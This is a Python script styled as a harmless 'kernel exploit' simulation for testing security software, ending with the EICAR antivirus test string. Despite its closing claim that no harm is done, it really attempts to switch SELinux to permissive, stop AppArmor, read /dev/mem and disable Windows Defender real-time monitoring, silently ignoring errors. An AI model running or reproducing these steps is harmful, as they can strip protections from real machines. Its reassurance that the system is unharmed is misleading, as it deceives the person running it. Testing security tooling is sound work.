#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import platform

RED = '\033[91m' if os.name == 'posix' else ''
YELLOW = '\033[93m' if os.name == 'posix' else ''
GREEN = '\033[92m' if os.name == 'posix' else ''
RESET = '\033[0m' if os.name == 'posix' else ''

def print_banner():
    print(f"{RED}========================================")
    print(f"   KERNEL EXPLOIT ATTEMPT")
    print(f"========================================{RESET}\n")

def test_root_linux():
    print(f"{YELLOW}[*] Attempting root access...{RESET}")
    try:
        subprocess.run(['sudo', 'echo', 'Root access simulated'], check=False, timeout=2)
    except:
        pass
    time.sleep(1)

def test_selinux():
    print(f"{YELLOW}[*] Attempting SELinux bypass...{RESET}")
    try:
        if os.path.exists('/sys/fs/selinux/enforce'):
            with open('/sys/fs/selinux/enforce', 'w') as f:
                f.write('0')
    except:
        pass
    time.sleep(1)

def test_apparmor():
    print(f"{YELLOW}[*] Attempting AppArmor bypass...{RESET}")
    try:
        subprocess.run(['systemctl', 'stop', 'apparmor'], check=False, timeout=2)
    except:
        pass
    time.sleep(1)

def test_kernel_access():
    print(f"{YELLOW}[*] Accessing kernel memory...{RESET}")
    try:
        if os.name == 'posix':
            with open('/dev/mem', 'rb') as f:
                f.read(1)
        else:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.GetModuleHandleW(None)
    except:
        pass
    time.sleep(1)

def test_registry_windows():
    print(f"{YELLOW}[*] Modifying registry...{RESET}")
    try:
        if os.name == 'nt':
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "EICAR_Test", 0, winreg.REG_SZ, "Test")
            winreg.CloseKey(key)
    except:
        pass
    time.sleep(1)

def test_defender_windows():
    print(f"{YELLOW}[*] Attempting Defender bypass...{RESET}")
    try:
        if os.name == 'nt':
            subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], check=False, timeout=2)
    except:
        pass
    time.sleep(1)

def test_amsi_windows():
    print(f"{YELLOW}[*] Attempting AMSI bypass...{RESET}")
    try:
        if os.name == 'nt':
            subprocess.run(['powershell', '-Command', '[Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")'], check=False, timeout=2)
    except:
        pass
    time.sleep(1)

def eicar_payload():
    print(f"{GREEN}[!] EICAR Test Payload:{RESET}")
    print("X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

def main():
    print_banner()
    if os.name == 'posix':
        test_root_linux()
        test_selinux()
        test_apparmor()
        test_kernel_access()
    elif os.name == 'nt':
        test_defender_windows()
        test_amsi_windows()
        test_registry_windows()
        test_kernel_access()
    eicar_payload()
    print(f"\n{RED}[!!!!] SIMULATION COMPLETE - NO HARM DONE{RESET}")
    print(f"{YELLOW}[!!!!] Your security system is working{RESET}")

if __name__ == "__main__":
    main()